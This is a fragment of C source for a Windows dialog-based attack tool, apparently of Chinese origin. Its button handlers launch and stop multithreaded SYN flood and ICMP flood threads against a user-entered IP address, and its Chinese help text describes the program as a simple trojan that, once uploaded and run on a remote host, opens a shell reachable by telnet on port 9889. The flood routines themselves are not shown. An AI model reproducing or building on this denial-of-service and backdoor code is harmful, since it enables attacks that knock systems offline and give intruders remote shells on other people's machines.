            SetDlgItemText(hwnd,IDC_MES,"Syn Flood Send OK ~~ !!");
			break;

        case IDC_SYNEND:
			GetDlgItemText(hwnd,IDC_SYNTHREAD,cSynThread,3);
			iSynThread = atoi(cSynThread);
			iSynThread++;
			for (i=0;i<iSynThread;i++)
			{
				TerminateThread(hThreadSyn[i],0);
			}
            SetDlgItemText(hwnd,IDC_MES,"Syn Flood End OK ~~ !!");
			break;

        case IDC_ICMPSEND:
		    GetDlgItemText(hwnd,IDC_ICMPIP,cIcmpIp,16);
			GetDlgItemText(hwnd,IDC_ICMPTHREAD,cIcmpThread,3);
			iIcmpThread = atoi(cIcmpThread);
			if (iIcmpThread < 1 || iIcmpThread > 200)
			{
				MessageBox(NULL,"Thread Error...","Error",0);
				break;
			}
			strcpy(cip,cIcmpIp);
			for (i=0;i<iIcmpThread;i++)
			{
				hThreadIcmp[i] = CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
			}
            SetDlgItemText(hwnd,IDC_MES,"Icmp Flood Send OK ~~ !!");
			break;

        case IDC_ICMPEND:
			GetDlgItemText(hwnd,IDC_ICMPTHREAD,cIcmpThread,3);
			iIcmpThread = atoi(cIcmpThread);
			iIcmpThread++;
			for (i=0;i<iIcmpThread;i++)
			{
				TerminateThread(hThreadIcmp[i],0);
			}
            SetDlgItemText(hwnd,IDC_MES,"Icmp Flood End OK ~~ !!");
			break;

        case IDC_HELP1:
			GetDlgItemText(hwnd,IDC_HELP1,ButText,6);
			if (*ButText == 'A')
			{
				SetDlgItemText(hwnd,IDC_EDIT,"关于:             在这里我要感谢CVC的所有给过我帮助的朋友,特别是jackhy,pkxp,pengjguo等.还有Yonsm这个程序的界面就是用的他的库:)");
				SetDlgItemText(hwnd,IDC_HELP1,"Help");
			}
			else
			{
                SetDlgItemText(hwnd,IDC_EDIT,"说明:             本程序具有简单的木马的功能也有简单的D.O.S的功能作为木马时你可以把他传到远程主机然后运行他就可以TELNET到远程主机的9889了,会有一个SHELL.");
                SetDlgItemText(hwnd,IDC_HELP1,"About");
			}

			break;

		case IDC_EXIT:
			ExitProcess(0);
		}
	}
	return 0;
}
